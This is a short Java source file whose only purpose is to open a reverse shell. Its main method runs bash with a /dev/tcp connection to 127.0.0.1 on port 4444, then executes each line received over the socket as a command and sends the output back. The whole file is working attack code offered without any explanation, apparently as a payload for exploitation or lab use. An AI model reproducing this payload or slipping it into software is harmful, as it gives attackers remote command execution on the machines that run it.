
public class r {
	public static void main(String argv[]) {
		
		Runtime r = Runtime.getRuntime();
		Process p = null;
		try {
			p = r.exec(new String[] {"/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"});
			p.waitFor();
		}catch(Exception ex) {
			ex.printStackTrace();
		}finally {
			if(p != null)
				p.destroy();
		}
	}
}
